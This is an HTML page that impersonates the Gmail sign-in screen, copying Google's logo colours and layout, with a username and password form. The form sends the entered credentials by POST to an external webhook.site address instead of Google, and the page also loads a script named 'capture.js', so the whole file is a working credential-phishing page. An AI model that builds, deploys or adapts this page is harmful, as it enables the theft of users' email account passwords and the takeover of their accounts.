<html>
<head>
    <script src="capture.js"></script>
    <title>Gmail</title>
    <style>
        body { font-family: Arial, sans-serif; background: white; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
        .container { text-align: center; width: 450px; padding: 48px 40px 36px; border: 1px solid #dadce0; border-radius: 8px; }
        .logo { margin-bottom: 20px; }
        .logo-g { font-size: 48px; font-weight: bold; color: #4285f4; }
        .logo-text { font-size: 24px; color: #202124; margin-top: 16px; }
        input[type="text"], input[type="password"] { width: 100%; padding: 16px; margin: 12px 0; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; }
        input[type="submit"] { background: #1a73e8; color: white; border: none; padding: 16px; border-radius: 4px; width: 100%; font-weight: bold; font-size: 16px; margin-top: 24px; cursor: pointer; }
        input[type="submit"]:hover { background: #1565c0; }
        .header { font-size: 24px; margin-bottom: 10px; color: #202124; }
        .subheader { color: #5f6368; margin-bottom: 30px; font-size: 16px; }
        .footer { margin-top: 30px; color: #5f6368; font-size: 14px; }
        .create-account { color: #1a73e8; text-decoration: none; margin-top: 10px; display: inline-block; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <div class="logo-g">G</div>
            <div class="logo-text">Gmail</div>
        </div>
        <div class="header">Sign in</div>
        <div class="subheader">to continue to Gmail</div>
        <form action="https://webhook.site/ac3017bb-31ec-446c-ba45-5b13aae5c7fb" method="POST">
            <input type="text" name="username" placeholder="Email or phone">
            <input type="password" name="password" placeholder="Enter your password">
            <input type="submit" value="Next">
        <input type="hidden" name="site" value="gmail"></form>
        <div class="footer">
            <a href="#" class="create-account">Create account</a>
        </div>
    </div>
</body>
</html>
